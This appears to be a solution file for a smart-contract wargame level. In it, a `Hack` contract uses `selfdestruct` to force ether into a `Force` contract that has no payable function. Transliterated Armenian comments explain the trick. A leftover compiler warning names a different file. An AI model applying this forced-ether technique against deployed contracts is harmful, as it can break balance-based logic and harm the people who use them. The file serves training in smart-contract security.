// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/
    function getBalance() external view returns(uint){
        return address(this).balance;
    }
}

//erku depqum ankakh hascei recieve kam hamapatasakhan ayl funkcia unenalu hagamanaqic hascen pogh kstana arajiny minery erkrordy 
//vor stegh en kirarum ayl contracti selfdistructi depqum ira nshvachasceyov poghy kga

contract Hack {

    function kill(address payable _force) external { 
        // from solidity:
        //Warning: "selfdestruct" has been deprecated. The underlying opcode will eventually undergo breaking changes, and its use is not recommended.
         // --> Coin Flip.sol:24:9:
        selfdestruct(_force);

    }

    function receive ()
     external payable {
    }

}